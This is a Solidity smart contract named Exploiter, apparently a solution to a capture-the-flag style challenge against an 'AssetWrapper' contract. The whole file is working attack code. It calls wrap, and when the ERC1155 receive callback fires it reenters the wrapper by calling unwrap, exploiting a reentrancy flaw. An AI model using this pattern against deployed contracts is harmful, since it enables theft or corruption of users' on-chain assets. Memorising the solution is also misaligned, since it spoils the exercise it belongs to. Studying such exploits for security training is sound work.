//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import {IERC1155Receiver} from "lib/openzeppelin-contracts/contracts/token/ERC1155/IERC1155Receiver.sol";
import {IERC165} from "lib/forge-std/src/interfaces/IERC165.sol";
import {AssetWrapper} from "./AssetWrapper.sol";

contract Exploiter is IERC1155Receiver {
    AssetWrapper immutable private assetWrapper;
    address private gameAsset;

    constructor(address _gameAsset, AssetWrapper _assetWrapper) {
        gameAsset = _gameAsset;
        assetWrapper = _assetWrapper;
    }

    function attack() public {
        assetWrapper.wrap(0, address(this), gameAsset);
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        assetWrapper.unwrap(address(this), gameAsset);
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address,
        address,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external pure override  returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4 interfaceID) external override pure returns (bool) {
        return 
            interfaceID == type(IERC165).interfaceId ||
            interfaceID == type(IERC1155Receiver).interfaceId;
    }
}